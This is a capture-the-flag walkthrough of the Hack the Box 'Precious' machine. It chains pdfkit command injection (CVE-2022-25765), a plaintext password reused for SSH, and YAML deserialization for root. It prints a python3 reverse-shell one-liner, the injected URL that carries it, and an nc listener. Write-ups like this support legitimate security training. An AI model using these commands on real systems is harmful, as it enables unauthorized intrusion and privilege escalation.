# Precious

This Hack the Box machine includes a command injection vulnerability and a blind remote code execution using YAML deserialization. I used a couple of walkthroughs to help me through this but I'm extending the discussion below to be a bit more beginner friendly. This is to help explain a bit of the why behind techniques and why certain things done in this walkthrough work. You can view the `dependencies.yml` file as a seperate doc within this folder.

**Youtube Walkthrough: [Available Here]()**

# Enumeration

After connecting to the VPN and launching the machine, I `ping` the target to check the connection. Then I perform an nmap scan of the top 1000 ports.

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

Here we discover ports 22 and 80 open. I run the default scripts on port 80 as this is used for web servers by default. There's an NGINX (version 1.18.0) web server running on port 80 and it also has Phusion Passenger 6.0.15 running on it. Running `whatweb` turns up extra information but nothing to obvious at this stage.

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

I also run `gobuster` to see if there are any subdirectories that I can access. This turns up nothing.

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

Next, I navigate to the page using `precious.htb` (which I added to the `/etc/host` file). We find a page with a dialogue box and the title "Convert Web Page to PDF" written at the top (see below).

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

I start a simple http server using python3: `python3 -m http.server 80`. 

> This command calls the HTTP Server module using the `-m` flag, and utilises port 80 for the service. 

Then, I enter my IP address as a http:// address and click **Submit**. This generates a PDF document based on the directory the web server is located. 

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

I then have a look at the metadata of the PDF (after downloading it) using `exiftool`. Here I see that the PDF was generated by `pdfkit v0.8.6`. 

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

At this stage I do a bit of research into Phusion Passenger and pdfkit for any known vulnerabilities. Phusion Passenger turns up nothing helpful. On the other hand, the version of pdfkit that's running on this web server has got a critical vulnerability. Snyk has a short CVE description on the  Proof of Concept for this vulnerability. CVE-2022-25765 is a command injection vulnerability.

> Command injection is listed as A03:Injection on the OWASP Top 10 list of web vulnerabilities. Basically, this vulnerability type allows an attacker to execute code on the system. OS command injection, which is what is exploitable on this machine, is when you are able to run commands that the actual OS behind the web service. This means that an attacker is able to access the server because the web server interprets requests made to it as commands for the system and not queries that run on the application that the user is interacting with. This can be due to poor practices in securing code by leaving user input unsanitised. Or it may be that functions and methods are used that are known to be vulnerable to this kind of attack. 

In the case of Precious, pdfkit has a critical vulnerability that allows an attacker to remotely execute arbitrary code on the host OS. In terms of complexity, this attack is not that complex as it requires you to query the server at the end of your uri source e.g. `http://[ip]/%20'[command]'` ➡️ `http://10.10.14.19/%20'whoami'` See the screenshot below.

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

Since we've been running our python3 server to pull data for the pdf we can observe the requests there. I tried to use Burpsuite to view responses but it wouldn't list out the responses as clearly as in the CLI. I enter what is shown in the above screenshot and recieved an error on the web page but in my server I received the response of the server disclosing the id of the user running the server. In this case it's "Ruby". "Ruby" has the UID of 1001 which means that there's another created user (as a opposed to root) on the server.

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

# Initial Foothold

Now that we've established a proof-of-concept that we can execute commands on the system, we can now try to get an initial foothold. We will need to execute a reverse shell using the POC above. To do so I used one of the reverse shell codes found on **0xdedinfosec's** walkthrough. 

> `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("XX.XX.XX.XX",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`

Where you see `XX.XX.XX.XX` this will need to be changed to the attacker's IP address. This code utilizes python3 to call back to the attackers machine and make a shell for us to move around the file system with. So, the full query will look like this:

> http://10.10.XX.XX/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`

After setting up a listener using `nc -lvnp 9001`, I execute the command and get a shell!

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

I check `whoami` and get "ruby" back. I then use `/bin/bash -i` to stabilize the shell.

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

I have a look arond the file system. I go to the home directory of "ruby" trying to look for a clue but find nothing at this point. I remember that there's probably another user on this system so I check the `/home` directory and find `user.txt`. I try to read it but I get a permission denied. This means that I need to find a way to elevate my privileges.

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

I keep looking around the file system for a while. Eventually I return to "ruby's" home directory and start going through each hidden directory there. When I cat the `config` file of the `.bundle` directory we get this:

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

It appears that henry's password is saved in plain text here or in some sort of encoding. I decide to try it out and ssh into the system as henry. and it works!!

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

Now we are able to `cat user.txt` and get the flag!!

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

# Privilege Escalation

Now that we've gained an initial foothold in the system, we want escalate our privileges. One of the first things I check is how `sudo` privileges have been confirgured. I run the `sudo -l` command, as this lists the permissions the current user has with regard to the `sudo` command.

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

Here we see that "henry" is permitted to run `/usr/bin/ruby /opt/update_dependencies.rb` without a password. Next, I have a look at the file `update_dependencies.rb` to see what we can do in there. 

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

The highlighted text is a vulnerable bit of code that will read `dependencies.yml` file with root permissions. This vulnerability is covered in [this blog](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/) if you want to read about it.

I then search for a dependencies.yml file throught system but find nothing. We are then able to create one in henry's home directory and execute the sudo command listed above. What we'll want to do is make it possible for us to become root. The first time I did this I followed 0xdedinfosec's walkthrough and use his POC to then execute a `/bin/bash` shell at root and elevate privileges that way. I think this is good but a possible better way is to give henry complete sudo privileges with no need for a password. You can view copy it from the `dependencies.yml` file in this repo. But this is what it looks like:

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

After executing `sudo /usr/bin/ruby /opt/update_dependencies.rb` the updater runs and then we test out our privileges using `sudo -l`. 

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

We now have elevated privileges. Now we can become root with minimal effort: `sudo su`.

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

We go to `/root` and `cat root.txt` for our flag.

<p>
<img src="" height="80%" width="80%" alt=""/>
</p>

# Mitigation Strategies and Summary

This machine features two vulnerabilities that when chained together can lead to pwning the box. I think the first vulnerability is pretty easy and straightforward to understand and acheive an exploit with. The second required more digging and exploration. At this point I personally don't know Ruby at all, so I needed to do a bit of reading and research into this vulnerability. There's some good documentation and research done on Ruby that I've included below if you want to know more. 

To mitigate this is pretty simple but critical. Firstly, the pdf converter, pdfkit, needs to be update to the latest version. Developers also need to keep an eye out on CVEs that affect pdfkit to ensure risk mitigation. Secondly, better secure code practices need to be put in place through code review and testing. The yaml.load() function deserializes YAML into Python and can then can write, read and load any text. The risk has been shown above that this can lead to lower privileged users escalating privileges. More recent versions cannot run this function without a Loader or FullLoader essentially taking away this vulnerability. 

Referenced Walkthroughs
- https://0xdedinfosec.vercel.app/blog/hackthebox-precious-writeup
- https://read.infos3c.net/hack-the-box-htb-writeup-precious

Referenced Blogs:
- https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/
- https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
- https://owasp.org/Top10/A03_2021-Injection/
